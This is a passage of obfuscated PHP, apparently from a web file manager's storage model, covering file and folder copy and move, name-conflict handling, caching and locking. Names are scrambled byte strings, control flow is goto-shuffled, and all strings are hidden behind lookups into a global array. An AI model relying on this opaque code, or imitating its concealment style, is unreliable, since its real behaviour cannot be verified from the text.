$A„İ·”ë‘ß, $e›¢¿ßê§Ğ, !0, $F®‚¼âÔ×…); goto aÂ‰ãæòÀ; B‡¢¦µ´¿‡: $this->updateModifyTime($d°à‚Áäõğ); return $B§ÖØ‡Óé³; goto Aò‰âÃ§¢‹; FÉ®„…ïÓî: if (!$A—“«õÁ– || !$B±„‚ÑÊ‹ || $B±„‚ÑÊ‹[$céÕÓ†ïò–[370]] != $céÕÓ†ïò–[83]) { return !1; } if ($this->isParentOf($bÚÀ­‰·Ú¡, $d°à‚Áäõğ)) { return !1; } $eÓ®äÃ“‘ = $F®‚¼âÔ×… ? $F®‚¼âÔ×… : $A—“«õÁ–[$céÕÓ†ïò–[28]]; goto C¢³ÇÎº‹ ; eì¶ÖŠ¤¸©: if ($A—“«õÁ–[$céÕÓ†ïò–[370]] == $céÕÓ†ïò–[83] && $AÁ¤ËÃ½µø == $B§ÖØ‡Óé³) { $this->folderSizeResetChildren($AÁ¤ËÃ½µø); } Model($céÕÓ†ïò–[504])->addAll($e›¢¿ßê§Ğ[$céÕÓ†ïò–[502]], array(), !0); if ($AÁ¤ËÃ½µø != $B§ÖØ‡Óé³ || $A—“«õÁ–[$céÕÓ†ïò–[370]] == $céÕÓ†ïò–[83]) { Model($céÕÓ†ïò–[505])->eventCopy($B§ÖØ‡Óé³); } goto eøƒ™¸ÄØ; Aò‰âÃ§¢‹: } private function _copy($FŒ¶„£ ¦¸, $a”ãŒóê¤, $DÇé»³ƒó, &$B´ß¾ñ©Ñ, $E¥¥ÛòÇï, $eéÛ±‡¡Œ„ = '') { goto a˜ÄÛ·±äÃ; a˜ÄÛ·±äÃ: $Aï¦¦÷ÇØİ =& $_SERVER[Æ]; $CÓÄÖ’éÅ = $this->sourceInfoCache($FŒ¶„£ ¦¸); $D¢–§¨¯¤‰ = $CÓÄÖ’éÅ[$Aï¦¦÷ÇØİ[370]] == $Aï¦¦÷ÇØİ[83]; goto bâ˜·¡Ëó¶; bâ˜·¡Ëó¶: $eÍ°½Ğ’ˆ¥ = $eéÛ±‡¡Œ„ ? $eéÛ±‡¡Œ„ : $CÓÄÖ’éÅ[$Aï¦¦÷ÇØİ[28]]; $bñ©¤ïĞïÙ = $this->fileNameExistCache($a”ãŒóê¤, $eÍ°½Ğ’ˆ¥); if ($E¥¥ÛòÇï) { $this->_childrenAllMake($FŒ¶„£ ¦¸); if ($D¢–§¨¯¤‰ && $bñ©¤ïĞïÙ) { $this->_childrenAllMake($bñ©¤ïĞïÙ); } } goto F¤‰…ì´ô’; F¤‰…ì´ô’: if (!$bñ©¤ïĞïÙ) { return $this->_copyCreate($FŒ¶„£ ¦¸, $a”ãŒóê¤, $eÍ°½Ğ’ˆ¥, $B´ß¾ñ©Ñ); } $D«‘—³ÀÊ = $bñ©¤ïĞïÙ; if ($D¢–§¨¯¤‰) { if ($DÇé»³ƒó == REPEAT_RENAME_FOLDER) { $eÍ°½Ğ’ˆ¥ = $this->fileNameAutoCache($a”ãŒóê¤, $eÍ°½Ğ’ˆ¥, $DÇé»³ƒó, $D¢–§¨¯¤‰); $D«‘—³ÀÊ = $this->_copyCreate($FŒ¶„£ ¦¸, $a”ãŒóê¤, $eÍ°½Ğ’ˆ¥, $B´ß¾ñ©Ñ); } else { $F™¬—Ë™“à = $this->_childrenList($FŒ¶„£ ¦¸); foreach ($F™¬—Ë™“à as $A‚ÚÇĞšĞ) { $this->_copy($A‚ÚÇĞšĞ[$Aï¦¦÷ÇØİ[369]], $bñ©¤ïĞïÙ, $DÇé»³ƒó, $B´ß¾ñ©Ñ, !1); } } } else { if ($DÇé»³ƒó == REPEAT_RENAME || $DÇé»³ƒó == REPEAT_RENAME_FOLDER) { $eÍ°½Ğ’ˆ¥ = $this->fileNameAutoCache($a”ãŒóê¤, $eÍ°½Ğ’ˆ¥, $DÇé»³ƒó, $D¢–§¨¯¤‰); $D«‘—³ÀÊ = $this->_copyCreate($FŒ¶„£ ¦¸, $a”ãŒóê¤, $eÍ°½Ğ’ˆ¥, $B´ß¾ñ©Ñ); } else { if ($DÇé»³ƒó == REPEAT_REPLACE) { $c±×Ëãº¸ = $this->sourceInfoCache($bñ©¤ïĞïÙ); $Dªºàßò‰ = $this->fileHistory($c±×Ëãº¸, $CÓÄÖ’éÅ[$Aï¦¦÷ÇØİ[419]], $CÓÄÖ’éÅ[$Aï¦¦÷ÇØİ[77]]); if ($Dªºàßò‰) { $B´ß¾ñ©Ñ[$Aï¦¦÷ÇØİ[501]][] = $CÓÄÖ’éÅ[$Aï¦¦÷ÇØİ[419]]; } } else { if ($DÇé»³ƒó == REPEAT_SKIP) { } } } Hook::trigger($Aï¦¦÷ÇØİ[506], array($Aï¦¦÷ÇØİ[507], $CÓÄÖ’éÅ, 0)); } goto dË¥Ù›Ïì; dË¥Ù›Ïì: return $D«‘—³ÀÊ; goto fÊĞğö ±—; fÊĞğö ±—: } private function _copyCreate($Aé¬é½¬‚É, $fÏƒâ î‰Á, $bøª§–”, &$DêŒ’¢å”ß) { goto E¯´Óà“„­; E¢¨½õŞÃ½: $F×‹™·×ÎÂ = $this->_makeItemData($fåÀ¿ÔÛ©, $fïöß×÷¬, $bøª§–”); Hook::trigger($aØ½‚™ŠæÓ[508], $F×‹™·×ÎÂ); Hook::trigger($aØ½‚™ŠæÓ[509], array($aØ½‚™ŠæÓ[510], $F×‹™·×ÎÂ, 0)); goto DçÓ§ø„Ì˜; dÈŒÕ„¿Ğ: $b›ÉÃ•¦ÆŒ = $this->sourceInfo($e…Ø¥ŸïçŞ); foreach ($bÔÎóåº¦ as $C¡‹ÍÀï÷ó) { $FÅ¸ºôÍÑ = $this->_makeItemData($C¡‹ÍÀï÷ó, $b›ÉÃ•¦ÆŒ, $C¡‹ÍÀï÷ó[$aØ½‚™ŠæÓ[28]]); $FÅ¸ºôÍÑ[$aØ½‚™ŠæÓ[459]] = $C¡‹ÍÀï÷ó[$aØ½‚™ŠæÓ[459]]; $D´¤á»ÒØ¶[] = $FÅ¸ºôÍÑ; } $this->chunkEventSet($aØ½‚™ŠæÓ[511], array($aØ½‚™ŠæÓ[512], $F×‹™·×ÎÂ, $BØ†½»á¡Ò)); goto C°ë¶ñãÕ»; bÎÙâÉ—¹§: if ($fåÀ¿ÔÛ©[$aØ½‚™ŠæÓ[370]] != $aØ½‚™ŠæÓ[83]) { $DêŒ’¢å”ß[$aØ½‚™ŠæÓ[501]][] = $fåÀ¿ÔÛ©[$aØ½‚™ŠæÓ[419]]; return $e…Ø¥ŸïçŞ; } $bÔÎóåº¦ = array(); $D´¤á»ÒØ¶ = array(); goto dÔàĞ¥óá’; C°ë¶ñãÕ»: $this->addAll($D´¤á»ÒØ¶, array(), !1); $EÙø“ÎŒÅá = $this->where(array($aØ½‚™ŠæÓ[461] => $e…Ø¥ŸïçŞ))->select(); $eºàª’Ñíß = $this->_childrenMakeRelation($bÔÎóåº¦, $EÙø“ÎŒÅá); goto Dô¤„¼–·´; d–¼Å´³Ï»: $this->chunkEventSet($aØ½‚™ŠæÓ[515], array($aØ½‚™ŠæÓ[516], $F×‹™·×ÎÂ, $BØ†½»á¡Ò)); $this->saveAll($c¼¨•Û¿«); return $e…Ø¥ŸïçŞ; goto A¶Š¢¼×¼¡; b¿“‡º¢ôá: foreach ($EÙø“ÎŒÅá as $C¡‹ÍÀï÷ó) { $FŒ½Ì¨íÉ„ = $C¡‹ÍÀï÷ó[$aØ½‚™ŠæÓ[369]]; $cé›¢¥‘£ = $this->_childrenMatch($eºàª’Ñíß, $C¡‹ÍÀï÷ó, $b›ÉÃ•¦ÆŒ); $Fø¬¡ë¿Ä[] = array($aØ½‚™ŠæÓ[369], $FŒ½Ì¨íÉ„, $aØ½‚™ŠæÓ[461], $cé›¢¥‘£[$aØ½‚™ŠæÓ[461]]); $c¼¨•Û¿«[] = array($aØ½‚™ŠæÓ[369], $FŒ½Ì¨íÉ„, $aØ½‚™ŠæÓ[459], $cé›¢¥‘£[$aØ½‚™ŠæÓ[459]]); $this->_copyApplyMeta($C¡‹ÍÀï÷ó, $DêŒ’¢å”ß); if ($C¡‹ÍÀï÷ó[$aØ½‚™ŠæÓ[370]] != $aØ½‚™ŠæÓ[83]) { $DêŒ’¢å”ß[$aØ½‚™ŠæÓ[501]][] = $C¡‹ÍÀï÷ó[$aØ½‚™ŠæÓ[419]]; } } $this->chunkEventSet($aØ½‚™ŠæÓ[513], array($aØ½‚™ŠæÓ[514], $F×‹™·×ÎÂ, $BØ†½»á¡Ò)); $this->saveAll($Fø¬¡ë¿Ä); goto d–¼Å´³Ï»; Dô¤„¼–·´: $eºàª’Ñíß[$Aé¬é½¬‚É] = $e…Ø¥ŸïçŞ; $Fø¬¡ë¿Ä = array(); $c¼¨•Û¿« = array(); goto b¿“‡º¢ôá; E¯´Óà“„­: $aØ½‚™ŠæÓ =& $_SERVER[Æ]; $fåÀ¿ÔÛ© = $this->sourceInfoCache($Aé¬é½¬‚É); $fïöß×÷¬ = $this->sourceInfoCache($fÏƒâ î‰Á); goto E¢¨½õŞÃ½; dÔàĞ¥óá’: $this->_childrenListAll($Aé¬é½¬‚É, $bÔÎóåº¦); $BØ†½»á¡Ò = count($bÔÎóåº¦); if ($BØ†½»á¡Ò == 0) { return $e…Ø¥ŸïçŞ; } goto dÈŒÕ„¿Ğ; DçÓ§ø„Ì˜: $e…Ø¥ŸïçŞ = $this->add($F×‹™·×ÎÂ); $dÓÑß“ƒÚ¹ = array($aØ½‚™ŠæÓ[369] => $e…Ø¥ŸïçŞ, $aØ½‚™ŠæÓ[28] => $bøª§–”); $this->_copyApplyMeta($dÓÑß“ƒÚ¹, $DêŒ’¢å”ß); goto bÎÙâÉ—¹§; A¶Š¢¼×¼¡: } private function _childrenMakeRelation($eÚ™¡¡±‘, $D˜«éÛ«) { $BäÑ¨Œ´Î =& $_SERVER[Æ]; $c®Íç–…æé = array(); $E«¢ë¡ï¨ = array(); foreach ($eÚ™¡¡±‘ as $CËÚ´ÕÜšö) { $EÛÍâ¯–±‹ = $CËÚ´ÕÜšö[$BäÑ¨Œ´Î[28]] . $BäÑ¨Œ´Î[8] . $CËÚ´ÕÜšö[$BäÑ¨Œ´Î[459]]; $c®Íç–…æé[$EÛÍâ¯–±‹] = $CËÚ´ÕÜšö[$BäÑ¨Œ´Î[369]]; } foreach ($D˜«éÛ« as $CËÚ´ÕÜšö) { $EÛÍâ¯–±‹ = $CËÚ´ÕÜšö[$BäÑ¨Œ´Î[28]] . $BäÑ¨Œ´Î[8] . $CËÚ´ÕÜšö[$BäÑ¨Œ´Î[459]]; $F½ƒÏŒê¼ = $c®Íç–…æé[$EÛÍâ¯–±‹]; $E«¢ë¡ï¨[$F½ƒÏŒê¼] = $CËÚ´ÕÜšö[$BäÑ¨Œ´Î[369]]; } return $E«¢ë¡ï¨; } private function _childrenMatch($AæËèÊ‘‹¶, $F­ÜÛ›ç²„, $FÇ·ä•Ëª¢) { goto díŸ¢‚†À©; b™ñ®‡ñÄÑ: foreach ($C÷À¬„òõ as $a˜¨ÕâØ“) { if (isset($AæËèÊ‘‹¶[$a˜¨ÕâØ“])) { $aÄÔ“­Ú¿ .= $AæËèÊ‘‹¶[$a˜¨ÕâØ“] . $Bî©¥ÎÓ©â[517]; } } $aÄÔ“­Ú¿ = rtrim($aÄÔ“­Ú¿, $Bî©¥ÎÓ©â[47]) . $Bî©¥ÎÓ©â[47]; $d²²ÕÜà¡¡ = $this->parentLevelArray($aÄÔ“­Ú¿); goto BƒøÃ—ˆ¶è; díŸ¢‚†À©: $Bî©¥ÎÓ©â =& $_SERVER[Æ]; $aÄÔ“­Ú¿ = $FÇ·ä•Ëª¢[$Bî©¥ÎÓ©â[459]]; $C÷À¬„òõ = $this->parentLevelArray($F­ÜÛ›ç²„[$Bî©¥ÎÓ©â[459]]); goto b™ñ®‡ñÄÑ; BƒøÃ—ˆ¶è: $Dˆ‚Å‡ˆñƒ = $d²²ÕÜà¡¡[count($d²²ÕÜà¡¡) - 1]; return array($Bî©¥ÎÓ©â[461] => $Dˆ‚Å‡ˆñƒ, $Bî©¥ÎÓ©â[459] => $aÄÔ“­Ú¿); goto dğó›ƒóÚ; dğó›ƒóÚ: } private function _makeItemData($B·àõ…Ê§, $EáÑ­Š±í, $fÑÀ‰ÆÆ†­) { $fŒ…ËôÉ©× =& $_SERVER[Æ]; $eáàÚøØğÈ = array($fŒ…ËôÉ©×[518] => $B·àõ…Ê§[$fŒ…ËôÉ©×[370]], $fŒ…ËôÉ©×[386] => $fÑÀ‰ÆÆ†­, $fŒ…ËôÉ©×[519] => $B·àõ…Ê§[$fŒ…ËôÉ©×[372]], $fŒ…ËôÉ©×[420] => $B·àõ…Ê§[$fŒ…ËôÉ©×[419]], $fŒ…ËôÉ©×[520] => $B·àõ…Ê§[$fŒ…ËôÉ©×[77]], $fŒ…ËôÉ©×[521] => $EáÑ­Š±í[$fŒ…ËôÉ©×[371]], $fŒ…ËôÉ©×[522] => $EáÑ­Š±í[$fŒ…ËôÉ©×[456]], $fŒ…ËôÉ©×[523] => USER_ID, $fŒ…ËôÉ©×[524] => USER_ID, $fŒ…ËôÉ©×[368] => $EáÑ­Š±í[$fŒ…ËôÉ©×[369]], $fŒ…ËôÉ©×[525] => $EáÑ­Š±í[$fŒ…ËôÉ©×[459]] . $EáÑ­Š±í[$fŒ…ËôÉ©×[369]] . $fŒ…ËôÉ©×[47], $fŒ…ËôÉ©×[396] => 0, $fŒ…ËôÉ©×[526] => $fŒ…ËôÉ©×[33]); return $eáàÚøØğÈ; } private function _copyApplyMeta($D¦‰ÀœÕò½, &$F¯Ñ›©âÁ£) { $b¬…äÕØ²” =& $_SERVER[Æ]; $EÈªî ï’æ = $D¦‰ÀœÕò½[$b¬…äÕØ²”[369]]; $cÄÛ„Ş›ò = $D¦‰ÀœÕò½[$b¬…äÕØ²”[28]]; if (!isset($D¦‰ÀœÕò½[$b¬…äÕØ²”[527]]) || !$D¦‰ÀœÕò½[$b¬…äÕØ²”[527]] || $D¦‰ÀœÕò½[$b¬…äÕØ²”[527]] == $b¬…äÕØ²”[468]) { $F¯Ñ›©âÁ£[$b¬…äÕØ²”[503]][] = array($b¬…äÕØ²”[369], $EÈªî ï’æ, $b¬…äÕØ²”[527], short_id($EÈªî ï’æ)); } if (Input::check($cÄÛ„Ş›ò, $b¬…äÕØ²”[528])) { $F¯Ñ›©âÁ£[$b¬…äÕØ²”[502]][] = array($b¬…äÕØ²”[369] => $EÈªî ï’æ, $b¬…äÕØ²”[89] => $b¬…äÕØ²”[416], $b¬…äÕØ²”[359] => str_replace($b¬…äÕØ²”[50], $b¬…äÕØ²”[33], Pinyin::encode($cÄÛ„Ş›ò))); $F¯Ñ›©âÁ£[$b¬…äÕØ²”[502]][] = array($b¬…äÕØ²”[369] => $EÈªî ï’æ, $b¬…äÕØ²”[89] => $b¬…äÕØ²”[415], $b¬…äÕØ²”[359] => Pinyin::encode($cÄÛ„Ş›ò, $b¬…äÕØ²”[529])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($CÆÑèæÔ¬Ø) { goto C‘…ÒèãÄ¼; aÄáéèîŞš: $a¶Î•ï´Éš = array_to_keyvalue($a¶Î•ï´Éš, $dš¿ÅˆÒˆÅ[369]); foreach ($a¶Î•ï´Éš as $F¶æÂ¾¤ìÑ) { $BµĞ´÷Òƒ = $F¶æÂ¾¤ìÑ[$dš¿ÅˆÒˆÅ[461]]; $CÆÑèæÔ¬Ø = $F¶æÂ¾¤ìÑ[$dš¿ÅˆÒˆÅ[369]]; if (!isset($this->_childrenListCache[$CÆÑèæÔ¬Ø]) && $F¶æÂ¾¤ìÑ[$dš¿ÅˆÒˆÅ[370]] == $dš¿ÅˆÒˆÅ[83]) { $this->_childrenListCache[$CÆÑèæÔ¬Ø] = array(); } if (!isset($this->_childrenListCache[$BµĞ´÷Òƒ])) { $this->_childrenListCache[$BµĞ´÷Òƒ] = array(); } $this->_childrenListCache[$BµĞ´÷Òƒ][$CÆÑèæÔ¬Ø] = $F¶æÂ¾¤ìÑ; $this->_childrenItemCache[$CÆÑèæÔ¬Ø] = $F¶æÂ¾¤ìÑ; } goto f·á†ˆÁ‡; aêÙ›¨š¢Ë: $A¼½³ì¹ÚÆ = array($dš¿ÅˆÒˆÅ[459] => array($dš¿ÅˆÒˆÅ[483], $cÈ†¬î‹ÓÉ[$dš¿ÅˆÒˆÅ[459]] . $CÆÑèæÔ¬Ø . $dš¿ÅˆÒˆÅ[484]), $dš¿ÅˆÒˆÅ[397] => $this->targetIsDelete); $a¶Î•ï´Éš = $this->field($b—î¡ßÍ£Æ)->where($A¼½³ì¹ÚÆ)->select(); if (!$a¶Î•ï´Éš) { return; } goto aÄáéèîŞš; C‘…ÒèãÄ¼: $dš¿ÅˆÒˆÅ =& $_SERVER[Æ]; $cÈ†¬î‹ÓÉ = $this->sourceInfo($CÆÑèæÔ¬Ø); $b—î¡ßÍ£Æ = $dš¿ÅˆÒˆÅ[530]; goto aêÙ›¨š¢Ë; f·á†ˆÁ‡: } private function _childrenListAll($cŠôÓ—÷²Ş, &$bÌ·‚ªŸß) { $Dƒ¹­ÑÍËß =& $_SERVER[Æ]; if (!isset($this->_childrenListCache[$cŠôÓ—÷²Ş])) { return; } $EíØ‘é“— = $this->_childrenListCache[$cŠôÓ—÷²Ş]; foreach ($EíØ‘é“— as $bÇ°¢‘Üš„ => $CË‘ê”å´ì) { $bÌ·‚ªŸß[$bÇ°¢‘Üš„] = $CË‘ê”å´ì; if ($CË‘ê”å´ì[$Dƒ¹­ÑÍËß[370]] == $Dƒ¹­ÑÍËß[83]) { $this->_childrenListAll($bÇ°¢‘Üš„, $bÌ·‚ªŸß); } } } private function sourceInfoCache($fçà…ù¼ƒï) { if (isset($this->_childrenItemCache[$fçà…ù¼ƒï])) { return $this->_childrenItemCache[$fçà…ù¼ƒï]; } return $this->sourceInfo($fçà…ù¼ƒï); } private function _childrenList($c¿ñ×ŠÃ¿) { if (isset($this->_childrenListCache[$c¿ñ×ŠÃ¿])) { return $this->_childrenListCache[$c¿ñ×ŠÃ¿]; } return $this->_childrenListSelect($c¿ñ×ŠÃ¿); } private function _childrenListSelect($E¦“„÷¡ëÉ) { goto dÖƒ‚Å÷‡¸; d¦Òæ¢Š¨–: foreach ($d‘½‘²½ as $E¦“„÷¡ëÉ => $DƒÅùö ¹Ë) { $this->_childrenItemCache[$E¦“„÷¡ëÉ] = $DƒÅùö ¹Ë; } return $d‘½‘²½; goto dÌÂİ…•·£; dÖƒ‚Å÷‡¸: $d…áäˆ´â  =& $_SERVER[Æ]; $C½“â·„Äë = array($d…áäˆ´â [461] => $E¦“„÷¡ëÉ, $d…áäˆ´â [397] => $this->targetIsDelete); $FˆİØáö½ = $this->where($C½“â·„Äë)->select(); goto eœœœœ«Ûİ; eœœœœ«Ûİ: $FˆİØáö½ = $FˆİØáö½ ? $FˆİØáö½ : array(); $d‘½‘²½ = array_to_keyvalue($FˆİØáö½, $d…áäˆ´â [369]); $this->_childrenListCache[$E¦“„÷¡ëÉ] = $d‘½‘²½; goto d¦Òæ¢Š¨–; dÌÂİ…•·£: } private function fileNameExistCache($F¦«‚Ù¡ªî, $e¦Š—Şº†Û) { $f¤íĞ×çì· =& $_SERVER[Æ]; $e¦Š—Şº†Û = strtolower($e¦Š—Şº†Û); $aœÚ¥‡Ü¢¨ = $this->_childrenList($F¦«‚Ù¡ªî); foreach ($aœÚ¥‡Ü¢¨ as $A‰±ëØÊİ) { if ($e¦Š—Şº†Û == strtolower($A‰±ëØÊİ[$f¤íĞ×çì·[28]])) { return $A‰±ëØÊİ[$f¤íĞ×çì·[369]]; } } return !1; } private function fileNameAutoCache($d£Ççµ¬•, $EìŞ×Å÷‰“, $FñÖ—ë¢ø³, $F‘ØŠÅ£») { $DØªÅÚòê =& $_SERVER[Æ]; $cß²Û‘¤Œ = $this->_childrenList($d£Ççµ¬•); $a³´Á”ù£Ú = array_to_keyvalue($cß²Û‘¤Œ, $DØªÅÚòê[33], $DØªÅÚòê[28]); return $this->fileNameAutoGet($a³´Á”ù£Ú, $EìŞ×Å÷‰“, $FñÖ—ë¢ø³, $F‘ØŠÅ£»); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($F¿°ãßËƒ, $cì´Ç…Àçƒ, $eŒˆìÔêõª = REPEAT_REPLACE, $B×¼¥æÑµ = '') { goto eŠƒ…ÊÁÙÓ; BÌ­‰Ù«£: $cÂ²ª½ÁØ¹ = array($F®²°¬ˆ£î[$f„À ÇŠ¿[461]], $cì´Ç…Àçƒ); if ($F®²°¬ˆ£î[$f„À ÇŠ¿[370]] == $f„À ÇŠ¿[83]) { $cÂ²ª½ÁØ¹[] = $F¿°ãßËƒ; } $this->updateModifyTime($cÂ²ª½ÁØ¹); goto C„Š’’ÑÑ; DøÉ•‰‘²ß: $c—íÀÈ‡æ = $this->_move($F¿°ãßËƒ, $cì´Ç…Àçƒ, $eŒˆìÔêõª, $bá²ÂÊÖ“¢, $B×¼¥æÑµ); $this->sourceCacheClear(); if ($F®²°¬ˆ£î[$f„À ÇŠ¿[370]] == $f„À ÇŠ¿[83] && $b·Ö§÷—”ß) { $this->folderSizeResetChildren($c—íÀÈ‡æ); } goto DË‡’¼™Õ“; dÏ‰Äº—İè: $AÔä³º†Ñ = $B×¼¥æÑµ ? $B×¼¥æÑµ : $F®²°¬ˆ£î[$f„À ÇŠ¿[28]]; $this->lockMoveStart($F¿°ãßËƒ); $this->lockWriteStart($cì´Ç…Àçƒ, $AÔä³º†Ñ); goto fÊÏ˜¿ò; fÊÏ˜¿ò: $bá²ÂÊÖ“¢ = array($f„À ÇŠ¿[501] => array(), $f„À ÇŠ¿[533] => !1); $this->clearShare($F¿°ãßËƒ, $cì´Ç…Àçƒ); $b·Ö§÷—”ß = $this->fileNameExistCache($cì´Ç…Àçƒ, $F®²°¬ˆ£î[$f„À ÇŠ¿[28]]); goto DøÉ•‰‘²ß; DË‡’¼™Õ“: Model($f„À ÇŠ¿[167])->linkAdd($bá²ÂÊÖ“¢[$f„À ÇŠ¿[501]]); if ($b·Ö§÷—”ß && $bá²ÂÊÖ“¢[$f„À ÇŠ¿[533]]) { $this->removeNow($F¿°ãßËƒ, !1); } $this->lockMoveEnd($F¿°ãßËƒ); goto dê÷Ûİ“‘; dê÷Ûİ“‘: $this->lockWriteEnd($cì´Ç…Àçƒ, $AÔä³º†Ñ); $this->folderSizeReset($F®²°¬ˆ£î[$f„À ÇŠ¿[461]]); $this->folderSizeReset($cì´Ç…Àçƒ); goto BÌ­‰Ù«£; eŠƒ…ÊÁÙÓ: $f„À ÇŠ¿ =& $_SERVER[Æ]; $F®²°¬ˆ£î = $this->sourceInfo($F¿°ãßËƒ); $CšÔÔ´®¼» = $this->sourceInfo($cì´Ç…Àçƒ); goto EØ¥äˆÈ¤‡; EØ¥äˆÈ¤‡: $f¾Ù¨ª’ñ£ = $this->pathInfoMore($F¿°ãßËƒ); if ($this->isParentOf($F¿°ãßËƒ, $cì´Ç…Àçƒ)) { return !1; } if (!$F®²°¬ˆ£î || !$CšÔÔ´®¼» || $CšÔÔ´®¼»[$f„À ÇŠ¿[370]] != $f„À ÇŠ¿[83]) { return !1; } goto DÙÈËäÁËµ; DÙÈËäÁËµ: Hook::trigger($f„À ÇŠ¿[531], $f¾Ù¨ª’ñ£); $this->targetIsDelete = intval($F®²°¬ˆ£î[$f„À ÇŠ¿[397]]); if ($F®²°¬ˆ£î[$f„À ÇŠ¿[461]] == $cì´Ç…Àçƒ && $B×¼¥æÑµ != $F®²°¬ˆ£î[$f„À ÇŠ¿[28]]) { $D£é­’å–´ = $this->fileNameExist($cì´Ç…Àçƒ, $B×¼¥æÑµ); if ($D£é­’å–´ && $F®²°¬ˆ£î[$f„À ÇŠ¿[370]] == $f„À ÇŠ¿[468]) { goto c‚“ÓŞåŒ; c‚“ÓŞåŒ: $A—‚˜¦İğù = $this->sourceInfo($D£é­’å–´); $Dñé¹È¼Ä„ = $this->fileHistory($A—‚˜¦İğù, $F®²°¬ˆ£î[$f„À ÇŠ¿[419]], $F®²°¬ˆ£î[$f„À ÇŠ¿[77]]); if (!$Dñé¹È¼Ä„) { Model($f„À ÇŠ¿[422])->remove($F®²°¬ˆ£î[$f„À ÇŠ¿[419]]); } goto fÌ©´¤‡×Ï; CÀ°ÂŒ¤º: return $D£é­’å–´; goto a›»ÔÖ±¾; fÌ©´¤‡×Ï: $this->removeNow($F¿°ãßËƒ, !1); $this->folderSizeReset($cì´Ç…Àçƒ); Hook::trigger($f„À ÇŠ¿[532], $f¾Ù¨ª’ñ£); goto CÀ°ÂŒ¤º; a›»ÔÖ±¾: } } goto dÏ‰Äº—İè; C„Š’’ÑÑ: Model($f„À ÇŠ¿[505])->eventMove($F¿°ãßËƒ, $F®²°¬ˆ£î[$f„À ÇŠ¿[461]], $cì´Ç…Àçƒ); Hook::trigger($f„À ÇŠ¿[532], $f¾Ù¨ª’ñ£); return $c—íÀÈ‡æ; goto A‘Ş……©ƒ; A‘Ş……©ƒ: } private function _move($CÇƒŸšÜ£Ê, $E˜òà¸¤ÇÆ, $F™—‡¥¯ã, &$D’ªªïóÓ¥, $bØùÙªÇ  = '') { goto fÊ›“‡ŞŸ¸; EĞ¿¨øß¦: $this->lockWriteStart($E˜òà¸¤ÇÆ, $a°ƒá¡¦˜); if (!$a» ¹È¾¯) { return $this->_moveForce($CÇƒŸšÜ£Ê, $E˜òà¸¤ÇÆ, $a°ƒá¡¦˜); } $d¾Š†àˆÀá = $a» ¹È¾¯; goto BŸéŒ“¸††; aÂå‚îÛ´¬: return $d¾Š†àˆÀá; goto Eè·¬›ëŞ; BŸéŒ“¸††: $bĞÈ’œƒÖ„ = !1; if ($D††•²ò†ó) { if ($F™—‡¥¯ã == REPEAT_RENAME_FOLDER) { $a°ƒá¡¦˜ = $this->fileNameAuto($E˜òà¸¤ÇÆ, $a°ƒá¡¦˜, $F™—‡¥¯ã, $D††•²ò†ó); $d¾Š†àˆÀá = $this->_moveForce($CÇƒŸšÜ£Ê, $E˜òà¸¤ÇÆ, $a°ƒá¡¦˜); } else { if ($F™—‡¥¯ã == REPEAT_RENAME_FOLDER) { $F™—‡¥¯ã = REPEAT_RENAME; } $EñÄ¹¨¯Û¯ = $this->_childrenListSelect($CÇƒŸšÜ£Ê); foreach ($EñÄ¹¨¯Û¯ as $f½¸˜´÷½) { $this->_move($f½¸˜´÷½[$b¡ç‡—Ö¢µ[369]], $a» ¹È¾¯, $F™—‡¥¯ã, $D’ªªïóÓ¥); } $bĞÈ’œƒÖ„ = !0; } } else { if ($F™—‡¥¯ã == REPEAT_SKIP) { $bĞÈ’œƒÖ„ = !0; } else { if ($F™—‡¥¯ã == REPEAT_RENAME || $F™—‡¥¯ã == REPEAT_RENAME_FOLDER) { $a°ƒá¡¦˜ = $this->fileNameAuto($E˜òà¸¤ÇÆ, $a°ƒá¡¦˜, $F™—‡¥¯ã, $D††•²ò†ó); $d¾Š†àˆÀá = $this->_moveForce($CÇƒŸšÜ£Ê, $E˜òà¸¤ÇÆ, $a°ƒá¡¦˜); } else { if ($F™—‡¥¯ã == REPEAT_REPLACE) { $eÍŒ‰ãé·‡ = $this->sourceInfoCache($a» ¹È¾¯); $Aøö¬Ï‘³ = $this->fileHistory($eÍŒ‰ãé·‡, $EËÌ†Á‰…[$b¡ç‡—Ö¢µ[419]], $EËÌ†Á‰…[$b¡ç‡—Ö¢µ[77]]); if ($Aøö¬Ï‘³) { $D’ªªïóÓ¥[$b¡ç‡—Ö¢µ[501]][] = $EËÌ†Á‰…[$b¡ç‡—Ö¢µ[419]]; } else { $bĞÈ’œƒÖ„ = !0; } } } } } if ($bĞÈ’œƒÖ„ && !$D’ªªïóÓ¥[$b¡ç‡—Ö¢µ[533]]) { $D’ªªïóÓ¥[$b¡ç‡—Ö¢µ[533]] = !0; } goto aÂå‚îÛ´¬; cÊ… ˆ˜‡: $a°ƒá¡¦˜ = $bØùÙªÇ  ? $bØùÙªÇ  : $EËÌ†Á‰…[$b¡ç‡—Ö¢µ[28]]; $a» ¹È¾¯ = $this->fileNameExistCache($E˜òà¸¤ÇÆ, $a°ƒá¡¦˜); $this->lockMoveStart($CÇƒŸšÜ£Ê); goto EĞ¿¨øß¦; fÊ›“‡ŞŸ¸: $b¡ç‡—Ö¢µ =& $_SERVER[Æ]; $EËÌ†Á‰… = $this->sourceInfo($CÇƒŸšÜ£Ê); $D††•²ò†ó = $EËÌ†Á‰…[$b¡ç‡—Ö¢µ[370]] == $b¡ç‡—Ö¢µ[83]; goto cÊ… ˆ˜‡; Eè·¬›ëŞ: } private function _moveForce($BˆÒĞÎéá, $d¡±âÆÄì†, $ağëÎø°) { goto e³Õ¼¤ô¸»; fÒ¨øñÁ¹: $CĞ§Œõƒ¶æ = $Cœ†“ù¤âß[$FÅÃ¹¬×·¬[370]] == $FÅÃ¹¬×·¬[83]; $dÊï™ÎêÄÁ = array($FÅÃ¹¬×·¬[368] => $bïÔÄÇ¹[$FÅÃ¹¬×·¬[369]], $FÅÃ¹¬×·¬[525] => $bïÔÄÇ¹[$FÅÃ¹¬×·¬[459]] . $bïÔÄÇ¹[$FÅÃ¹¬×·¬[369]] . $FÅÃ¹¬×·¬[47], $FÅÃ¹¬×·¬[521] => $bïÔÄÇ¹[$FÅÃ¹¬×·¬[371]], $FÅÃ¹¬×·¬[522] => $bïÔÄÇ¹[$FÅÃ¹¬×·¬[456]], $FÅÃ¹¬×·¬[524] => USER_ID, $FÅÃ¹¬×·¬[386] => $ağëÎø°); $B±æ¨ÓÓí¸ = 